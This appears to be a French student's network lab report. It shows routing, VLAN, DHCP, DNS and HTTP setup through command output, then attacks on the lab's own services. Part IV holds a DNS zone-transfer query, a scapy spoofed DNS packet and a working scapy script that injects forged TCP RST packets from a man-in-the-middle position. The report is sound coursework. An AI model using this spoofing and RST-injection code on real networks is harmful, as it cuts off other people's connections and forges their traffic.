# Partie I : Setup initial
<br>

## B. On ajoute les routes vers les LAN

### 🌞 ping d'un client du  LAN1 vers un client du LAN 2
```
PC1> ping 10.3.2.10
84 bytes from 10.3.2.10 icmp_seq=1 ttl=62 time=47.124 ms
84 bytes from 10.3.2.10 icmp_seq=2 ttl=62 time=28.384 ms
84 bytes from 10.3.2.10 icmp_seq=3 ttl=62 time=36.016 ms
84 bytes from 10.3.2.10 icmp_seq=4 ttl=62 time=42.160 ms
84 bytes from 10.3.2.10 icmp_seq=5 ttl=62 time=56.600 ms
```
<br>

### 🌞 Capture Wireshark ping_partie1
> _voir ping_partie1_

<br>

### 🌞 Afficher les adresses MAC des routeurs
```
R1#show arp
Protocol  Address          Age (min)  Hardware Addr   Type   Interface
Internet  10.3.1.10              17   0050.7966.6800  ARPA   FastEthernet0/1
Internet  10.3.12.1               -   c401.05cd.0010  ARPA   FastEthernet1/0
Internet  10.3.12.2              20   c402.05eb.0000  ARPA   FastEthernet1/0
Internet  192.168.230.152         -   c401.05cd.0000  ARPA   FastEthernet0/0
Internet  192.168.230.254         6   0050.56fa.0913  ARPA   FastEthernet0/0
Internet  192.168.230.2          20   0050.56f5.4558  ARPA   FastEthernet0/0
Internet  10.3.1.254              -   c401.05cd.0001  ARPA   FastEthernet0/1
```
<br>

## C. Accès internet

### 🌞 Prouvez que vous avez déjà un accès internet sur r1
```
R1#ping 1.1.1.1

Type escape sequence to abort.
Sending 5, 100-byte ICMP Echos to 1.1.1.1, timeout is 2 seconds:
!!!!!
Success rate is 100 percent (5/5), round-trip min/avg/max = 88/115/152 ms
```
<br>

### 🌞 Accès internet LAN1
```
PC1> ping 1.1.1.1
84 bytes from 1.1.1.1 icmp_seq=1 ttl=127 time=42.371 ms
84 bytes from 1.1.1.1 icmp_seq=2 ttl=127 time=72.876 ms
84 bytes from 1.1.1.1 icmp_seq=3 ttl=127 time=53.280 ms
84 bytes from 1.1.1.1 icmp_seq=4 ttl=127 time=41.834 ms
84 bytes from 1.1.1.1 icmp_seq=5 ttl=127 time=60.164 ms
```

### 🌞 Accès internet LAN2
```
PC3> ping 1.1.1.1
1.1.1.1 icmp_seq=1 timeout
84 bytes from 1.1.1.1 icmp_seq=2 ttl=126 time=74.706 ms
84 bytes from 1.1.1.1 icmp_seq=3 ttl=126 time=71.985 ms
84 bytes from 1.1.1.1 icmp_seq=4 ttl=126 time=56.452 ms
84 bytes from 1.1.1.1 icmp_seq=5 ttl=126 time=47.118 ms
```
<br>
<br>

# Partie II : Router-on-a-stick
<br>

## A. VLANs

### 🌞 Tests de ping
```
PC1> ping 10.3.1.2
84 bytes from 10.3.1.2 icmp_seq=1 ttl=64 time=1.944 ms
84 bytes from 10.3.1.2 icmp_seq=2 ttl=64 time=2.533 ms
84 bytes from 10.3.1.2 icmp_seq=3 ttl=64 time=3.542 ms
84 bytes from 10.3.1.2 icmp_seq=4 ttl=64 time=1.886 ms
84 bytes from 10.3.1.2 icmp_seq=5 ttl=64 time=2.505 ms
```
<br>

## B. Routeur

### 🌞 Tests de ping

➜ le routeur peut ping tout le monde
```
R1#ping 10.3.1.1

Type escape sequence to abort.
Sending 5, 100-byte ICMP Echos to 10.3.1.1, timeout is 2 seconds:
!!!!!
Success rate is 100 percent (5/5), round-trip min/avg/max = 60/60/64 ms
```
```
R1#ping 10.3.2.1

Type escape sequence to abort.
Sending 5, 100-byte ICMP Echos to 10.3.2.1, timeout is 2 seconds:
!!!!!
Success rate is 100 percent (5/5), round-trip min/avg/max = 32/56/64 ms
```
<br>

➜ le LAN1 et le LAN2 se ping
```
PC1> sh ip

NAME        : PC1[1]
IP/MASK     : 10.3.1.1/24
GATEWAY     : 10.3.1.254
DNS         :
MAC         : 00:50:79:66:68:00
LPORT       : 10008
RHOST:PORT  : 127.0.0.1:10009
MTU:        : 1500
```
```
PC1> ping 10.3.2.1
84 bytes from 10.3.2.1 icmp_seq=1 ttl=63 time=16.391 ms
84 bytes from 10.3.2.1 icmp_seq=2 ttl=63 time=42.185 ms
84 bytes from 10.3.2.1 icmp_seq=3 ttl=63 time=26.297 ms
84 bytes from 10.3.2.1 icmp_seq=4 ttl=63 time=21.893 ms
84 bytes from 10.3.2.1 icmp_seq=5 ttl=63 time=38.951 ms
```
<br>

### 🌞 Tests de ping

➜ le routeur peut ping internet
```
R1#ping 1.1.1.1

Type escape sequence to abort.
Sending 5, 100-byte ICMP Echos to 1.1.1.1, timeout is 2 seconds:
!!!!!
Success rate is 100 percent (5/5), round-trip min/avg/max = 88/94/104 ms
```

➜ n'importe quel client a un accès internet
```
PC3> sh ip

NAME        : PC3[1]
IP/MASK     : 10.3.1.2/24
GATEWAY     : 10.3.1.254
DNS         :
MAC         : 00:50:79:66:68:02
LPORT       : 10010
RHOST:PORT  : 127.0.0.1:10011
MTU:        : 1500

PC3> ping 1.1.1.1
84 bytes from 1.1.1.1 icmp_seq=1 ttl=127 time=68.307 ms
84 bytes from 1.1.1.1 icmp_seq=2 ttl=127 time=42.736 ms
84 bytes from 1.1.1.1 icmp_seq=3 ttl=127 time=39.531 ms
84 bytes from 1.1.1.1 icmp_seq=4 ttl=127 time=37.326 ms
84 bytes from 1.1.1.1 icmp_seq=5 ttl=127 time=50.852 ms
```

```
PC2> sh ip

NAME        : PC2[1]
IP/MASK     : 10.3.2.1/24
GATEWAY     : 10.3.2.254
DNS         :
MAC         : 00:50:79:66:68:01
LPORT       : 10012
RHOST:PORT  : 127.0.0.1:10013
MTU:        : 1500

PC2> ping 1.1.1.1
84 bytes from 1.1.1.1 icmp_seq=1 ttl=127 time=56.207 ms
84 bytes from 1.1.1.1 icmp_seq=2 ttl=127 time=55.537 ms
84 bytes from 1.1.1.1 icmp_seq=3 ttl=127 time=48.040 ms
84 bytes from 1.1.1.1 icmp_seq=4 ttl=127 time=42.674 ms
84 bytes from 1.1.1.1 icmp_seq=5 ttl=127 time=36.671 ms
```
<br>
<br>

# Partie III : Services dans le LAN

<br>

## 1. DHCP

### 🌞 Prouvez avec un VPCS

```
PC4> ip dhcp
DDORA IP 10.3.2.10/24 GW 10.3.2.254
```
```
PC4> sh ip

NAME        : PC4[1]
IP/MASK     : 10.3.2.10/24
GATEWAY     : 10.3.2.254
DNS         : 1.1.1.1
DHCP SERVER : 10.3.2.253
DHCP LEASE  : 43197, 43200/21600/37800
MAC         : 00:50:79:66:68:03
LPORT       : 10018
RHOST:PORT  : 127.0.0.1:10019
MTU:        : 1500
```
```
PC4> ping efrei.fr
efrei.fr resolved to 51.255.68.208
84 bytes from 51.255.68.208 icmp_seq=1 ttl=127 time=45.927 ms
84 bytes from 51.255.68.208 icmp_seq=2 ttl=127 time=44.713 ms
84 bytes from 51.255.68.208 icmp_seq=3 ttl=127 time=43.098 ms
84 bytes from 51.255.68.208 icmp_seq=4 ttl=127 time=46.588 ms
84 bytes from 51.255.68.208 icmp_seq=5 ttl=127 time=47.600 ms
```
<br>

## 2. DNS

### 🌞 Tests résolutions DNS
```
PC4> ping dns.tp3.b2
dns.tp3.b2 resolved to 10.3.3.1
84 bytes from 10.3.3.1 icmp_seq=1 ttl=63 time=21.650 ms
84 bytes from 10.3.3.1 icmp_seq=2 ttl=63 time=18.347 ms
84 bytes from 10.3.3.1 icmp_seq=3 ttl=63 time=18.036 ms
84 bytes from 10.3.3.1 icmp_seq=4 ttl=63 time=21.596 ms
84 bytes from 10.3.3.1 icmp_seq=5 ttl=63 time=20.705 ms
```
```
PC4> ping efrei.fr
efrei.fr resolved to 51.255.68.208
84 bytes from 51.255.68.208 icmp_seq=1 ttl=127 time=53.121 ms
84 bytes from 51.255.68.208 icmp_seq=2 ttl=127 time=46.593 ms
84 bytes from 51.255.68.208 icmp_seq=3 ttl=127 time=46.012 ms
84 bytes from 51.255.68.208 icmp_seq=4 ttl=127 time=44.580 ms
84 bytes from 51.255.68.208 icmp_seq=5 ttl=127 time=54.847 ms
```

<br>

### 🌞 Capture Wireshark

> _voir ping_dns.pcapng_

<br>

## 3. HTTP

### 🌞 Preuve avec un client
Dans le doute, je t'ai mis tout le résultat. Bonne lecture :))
```
tstuzr㉿kali-test)-[~]
└─$ curl http://web.tp3.b2                                       
<!doctype html>
<html>
  <head>
    <meta charset='utf-8'>
    <meta name='viewport' content='width=device-width, initial-scale=1'>
    <title>HTTP Server Test Page powered by: Rocky Linux</title>
    <style type="text/css">
      /*<![CDATA[*/
      
      html {
        height: 100%;
        width: 100%;
      }  
        body {
  background: rgb(20,72,50);
  background: -moz-linear-gradient(180deg, rgba(23,43,70,1) 30%, rgba(0,0,0,1) 90%)  ;
  background: -webkit-linear-gradient(180deg, rgba(23,43,70,1) 30%, rgba(0,0,0,1) 90%) ;
  background: linear-gradient(180deg, rgba(23,43,70,1) 30%, rgba(0,0,0,1) 90%);
  background-repeat: no-repeat;
  background-attachment: fixed;
  filter: progid:DXImageTransform.Microsoft.gradient(startColorstr="#3c6eb4",endColorstr="#3c95b4",GradientType=1); 
        color: white;
        font-size: 0.9em;
        font-weight: 400;
        font-family: 'Montserrat', sans-serif;
        margin: 0;
        padding: 10em 6em 10em 6em;
        box-sizing: border-box;      
        
      }

   
  h1 {
    text-align: center;
    margin: 0;
    padding: 0.6em 2em 0.4em;
    color: #fff;
    font-weight: bold;
    font-family: 'Montserrat', sans-serif;
    font-size: 2em;
  }
  h1 strong {
    font-weight: bolder;
    font-family: 'Montserrat', sans-serif;
  }
  h2 {
    font-size: 1.5em;
    font-weight:bold;
  }
  
  .title {
    border: 1px solid black;
    font-weight: bold;
    position: relative;
    float: right;
    width: 150px;
    text-align: center;
    padding: 10px 0 10px 0;
    margin-top: 0;
  }
  
  .description {
    padding: 45px 10px 5px 10px;
    clear: right;
    padding: 15px;
  }
  
  .section {
    padding-left: 3%;
   margin-bottom: 10px;
  }
  
  img {
  
    padding: 2px;
    margin: 2px;
  }
  a:hover img {
    padding: 2px;
    margin: 2px;
  }

  :link {
    color: rgb(199, 252, 77);
    text-shadow:
  }
  :visited {
    color: rgb(122, 206, 255);
  }
  a:hover {
    color: rgb(16, 44, 122);
  }
  .row {
    width: 100%;
    padding: 0 10px 0 10px;
  }
  
  footer {
    padding-top: 6em;
    margin-bottom: 6em;
    text-align: center;
    font-size: xx-small;
    overflow:hidden;
    clear: both;
  }
 
  .summary {
    font-size: 140%;
    text-align: center;
  }

  #rocky-poweredby img {
    margin-left: -10px;
  }

  #logos img {
    vertical-align: top;
  }
  
  /* Desktop  View Options */
 
  @media (min-width: 768px)  {
  
    body {
      padding: 10em 20% !important;
    }
    
    .col-md-1, .col-md-2, .col-md-3, .col-md-4, .col-md-5, .col-md-6,
    .col-md-7, .col-md-8, .col-md-9, .col-md-10, .col-md-11, .col-md-12 {
      float: left;
    }
  
    .col-md-1 {
      width: 8.33%;
    }
    .col-md-2 {
      width: 16.66%;
    }
    .col-md-3 {
      width: 25%;
    }
    .col-md-4 {
      width: 33%;
    }
    .col-md-5 {
      width: 41.66%;
    }
    .col-md-6 {
      border-left:3px ;
      width: 50%;
      

    }
    .col-md-7 {
      width: 58.33%;
    }
    .col-md-8 {
      width: 66.66%;
    }
    .col-md-9 {
      width: 74.99%;
    }
    .col-md-10 {
      width: 83.33%;
    }
    .col-md-11 {
      width: 91.66%;
    }
    .col-md-12 {
      width: 100%;
    }
  }
  
  /* Mobile View Options */
  @media (max-width: 767px) {
    .col-sm-1, .col-sm-2, .col-sm-3, .col-sm-4, .col-sm-5, .col-sm-6,
    .col-sm-7, .col-sm-8, .col-sm-9, .col-sm-10, .col-sm-11, .col-sm-12 {
      float: left;
    }
  
    .col-sm-1 {
      width: 8.33%;
    }
    .col-sm-2 {
      width: 16.66%;
    }
    .col-sm-3 {
      width: 25%;
    }
    .col-sm-4 {
      width: 33%;
    }
    .col-sm-5 {
      width: 41.66%;
    }
    .col-sm-6 {
      width: 50%;
    }
    .col-sm-7 {
      width: 58.33%;
    }
    .col-sm-8 {
      width: 66.66%;
    }
    .col-sm-9 {
      width: 74.99%;
    }
    .col-sm-10 {
      width: 83.33%;
    }
    .col-sm-11 {
      width: 91.66%;
    }
    .col-sm-12 {
      width: 100%;
    }
    h1 {
      padding: 0 !important;
    }
  }
        
  
  </style>
  </head>
  <body>
    <h1>HTTP Server <strong>Test Page</strong></h1>

    <div class='row'>
    
      <div class='col-sm-12 col-md-6 col-md-6 '></div>
          <p class="summary">This page is used to test the proper operation of
            an HTTP server after it has been installed on a Rocky Linux system.
            If you can read this page, it means that the software is working
            correctly.</p>
      </div>
      
      <div class='col-sm-12 col-md-6 col-md-6 col-md-offset-12'>
     
       
        <div class='section'>
          <h2>Just visiting?</h2>

          <p>This website you are visiting is either experiencing problems or
          could be going through maintenance.</p>

          <p>If you would like the let the administrators of this website know
          that you've seen this page instead of the page you've expected, you
          should send them an email. In general, mail sent to the name
          "webmaster" and directed to the website's domain should reach the
          appropriate person.</p>

          <p>The most common email address to send to is:
          <strong>"webmaster@example.com"</strong></p>
    
          <h2>Note:</h2>
          <p>The Rocky Linux distribution is a stable and reproduceable platform
          based on the sources of Red Hat Enterprise Linux (RHEL). With this in
          mind, please understand that:

        <ul>
          <li>Neither the <strong>Rocky Linux Project</strong> nor the
          <strong>Rocky Enterprise Software Foundation</strong> have anything to
          do with this website or its content.</li>
          <li>The Rocky Linux Project nor the <strong>RESF</strong> have
          "hacked" this webserver: This test page is included with the
          distribution.</li>
        </ul>
        <p>For more information about Rocky Linux, please visit the
          <a href="https://rockylinux.org/"><strong>Rocky Linux
          website</strong></a>.
        </p>
        </div>
      </div>
      <div class='col-sm-12 col-md-6 col-md-6 col-md-offset-12'>
        <div class='section'>
         
          <h2>I am the admin, what do I do?</h2>

        <p>You may now add content to the webroot directory for your
        software.</p>

        <p><strong>For systems using the
        <a href="https://httpd.apache.org/">Apache Webserver</strong></a>:
        You can add content to the directory <code>/var/www/html/</code>.
        Until you do so, people visiting your website will see this page. If
        you would like this page to not be shown, follow the instructions in:
        <code>/etc/httpd/conf.d/welcome.conf</code>.</p>

        <p><strong>For systems using
        <a href="https://nginx.org">Nginx</strong></a>:
        You can add your content in a location of your
        choice and edit the <code>root</code> configuration directive
        in <code>/etc/nginx/nginx.conf</code>.</p>
        
        <div id="logos">
          <a href="https://rockylinux.org/" id="rocky-poweredby"><img src="icons/poweredby.png" alt="[ Powered by Rocky Linux ]" /></a> <!-- Rocky -->
          <img src="poweredby.png" /> <!-- webserver -->
        </div>       
      </div>
      </div>
      
      <footer class="col-sm-12">
      <a href="https://apache.org">Apache&trade;</a> is a registered trademark of <a href="https://apache.org">the Apache Software Foundation</a> in the United States and/or other countries.<br />
      <a href="https://nginx.org">NGINX&trade;</a> is a registered trademark of <a href="https://">F5 Networks, Inc.</a>.
      </footer>
      
  </body>
</html>
```


<br>
<br>

# Partie IV : Attaques sur les services en place

<br>

## 1. DNS

## A. Transfert de zone

### 🌞 Requêter l'enregistrement AXFR
```
(tstuzr㉿kali-test)-[~]
└─$ dig @dns.tp3.b2 tp3.b2 AXFR

; <<>> DiG 9.19.19-1-Debian <<>> @dns.tp3.b2 tp3.b2 AXFR
; (1 server found)
;; global options: +cmd
tp3.b2.                 86400   IN      SOA     dns.tp3.b2. admin.tp3.b2. 2019061800 3600 1800 604800 86400
tp3.b2.                 86400   IN      NS      dns.tp3.b2.
dns.tp3.b2.             86400   IN      A       10.3.3.1
supersite.tp3.b2.       86400   IN      A       10.3.3.2
web.tp3.b2.             86400   IN      A       10.3.3.2
tp3.b2.                 86400   IN      SOA     dns.tp3.b2. admin.tp3.b2. 2019061800 3600 1800 604800 86400
;; Query time: 44 msec
;; SERVER: 10.3.3.1#53(dns.tp3.b2) (TCP)
;; WHEN: Thu Dec 19 11:59:40 CET 2024
;; XFR size: 6 records (messages 1, bytes 221)
```

<br>

## B. Flood

### 🌞 Spoof DNS query
```
>>> ip=IP(src="10.3.2.10", dst="10.3.3.1")
>>> udp=UDP(sport=RandShort(), dport=53)
>>> dns=DNS(rd=1, qd=DNSQR(qname="dns.tp3.b2"))
>>> pkt= ip / udp / dns
>>> send(pkt)
.
Sent 1 packets.
```
> _voir spoof_dns_query.pcapng_

<br>

## 2. TCP

## A. TCP RST

### 🌞 Mettre en place une attaque TCP RST

Avec scapy, j'ai essayé de sniff les paquets tcp du réseau sauf que ça recevait que les paquets qui passaient par ma machine attaquante (même quand je mettais "promisc=True" et "sysctl net.ipv4.ip_forward=1").  
Du coup me suis incrustée entre ma victime et le routeur pour avoir les paquets.  
A partir de là je lance mon script.  
```bash
#!/usr/bin/python

from scapy.all import *

def send_rst(packet):
    if packet[TCP].flags=="A":
        src_ip=packet[IP].dst
        dst_ip=packet[IP].src
        src_port=packet[TCP].dport
        dst_port=packet[TCP].sport
        ack=packet[TCP].ack
        len_tram=len(packet[TCP].payload)

        new_seq=ack+len_tram

        rst=IP(src=src_ip, dst=dst_ip)/ TCP(sport=src_port, dport=dst_port, flags="R", seq=new_seq)
        send(rst)



sniff(filter="tcp", prn=send_rst, promisc=True, count=0)
```





